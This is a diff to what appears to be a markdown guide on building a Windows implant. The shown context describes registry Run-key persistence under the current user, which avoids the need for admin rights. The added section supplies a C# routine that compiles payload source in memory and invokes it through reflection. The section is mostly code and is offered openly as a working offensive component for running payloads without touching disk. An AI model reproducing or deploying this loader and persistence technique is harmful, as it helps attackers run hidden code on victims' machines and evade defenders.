@@ -63,3 +63,35 @@ namespace Program
 }
 ```
 > Note: We use the local user path in the registry. That way we don't have to be local administrator to add the entry to the registry. Downside is that it'll only run as the current logged in user.
+
+# Reflection
+This is the part that compiles and runs the payloads. Don't forget to add the necessary libraries for your payload as reference:
+```cs
+static void CompileAndRun(string payload)
+        {
+            CompilerParameters CompilerParams = new CompilerParameters
+            {
+                GenerateInMemory = true,
+                TreatWarningsAsErrors = false,
+                GenerateExecutable = false,
+                CompilerOptions = "/optimize"
+            };
+
+            string[] references = { "System.dll", "mscorlib.dll" };
+            CompilerParams.ReferencedAssemblies.AddRange(references);
+
+            CSharpCodeProvider provider = new CSharpCodeProvider();
+            CompilerResults compile = provider.CompileAssemblyFromSource(CompilerParams, payload);
+
+            Module module = compile.CompiledAssembly.GetModules()[0];
+            Type mt = null;
+            MethodInfo methInfo = null;
+
+            if (module != null)
+                mt = module.GetType("Program.Program");
+            if (mt != null)
+                methInfo = mt.GetMethod("Main");
+            if (methInfo != null)
+                methInfo.Invoke(null, new object[] { "arg" });
+        }
+```
